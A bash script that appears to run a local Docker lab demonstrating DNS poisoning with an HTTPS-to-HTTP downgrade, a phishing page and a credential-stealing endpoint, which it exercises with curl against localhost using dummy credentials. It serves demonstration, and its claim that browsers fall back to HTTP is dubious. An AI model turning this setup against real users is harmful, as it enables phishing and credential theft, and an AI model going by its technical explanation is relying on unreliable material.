#!/bin/bash

echo "=== DNS Poisoning Attack Demo ==="

# Setup
chmod +x scripts/mkcert.sh upstream/init.sh
bash scripts/mkcert.sh

echo ""
echo "Starting attack infrastructure..."
docker-compose down 2>/dev/null
docker-compose up -d

sleep 5

echo ""
echo "=== ATTACK SCENARIO ==="
echo "1. Victim wants to visit: https://victim.local/secure"
echo "2. DNS is poisoned to point victim.local to attacker IP"
echo "3. Browser requests HTTPS but gets downgraded to HTTP"
echo "4. Attacker serves malicious content over HTTP"

echo ""
echo "=== DEMO URLS ==="
echo "🎯 ATTACK: http://localhost/   (simulates poisoned DNS)"
echo "🎯 PHISHING: http://localhost/phish"
echo "🔒 LEGITIMATE: https://localhost:8443/   (real site)"
echo "🚨 ATTACKER HTTPS: https://localhost/redirect-to-attacker-https"

echo ""
echo "=== Testing the Attack ==="

echo "1. What victim types in browser:"
echo "   https://victim.local/secure"
echo ""

echo "2. What victim actually gets (DNS poisoned):"
curl -s http://localhost/ | grep -A5 -B5 "DNS Poisoning"

echo ""
echo "3. Credentials would be stolen:"
curl -s "http://localhost/steal-creds?username=victim&password=secret123" | grep -A3 "Attack Successful"

echo ""
echo "=== Instructions for Manual Testing ==="
echo "1. Add to /etc/hosts (or Windows hosts file):"
echo "   127.0.0.1 victim.local"
echo "   127.0.0.1 attacker.local"
echo ""
echo "2. In browser, try to visit: https://victim.local"
echo "   - Browser should fall back to HTTP"
echo "   - You'll see the attack page"
echo ""
echo "3. Compare with legitimate site: https://victim.local:8443"
echo "   - This shows what the real site looks like"
echo ""
echo "🚨 The attack works because DNS poisoning forces HTTP instead of HTTPS!"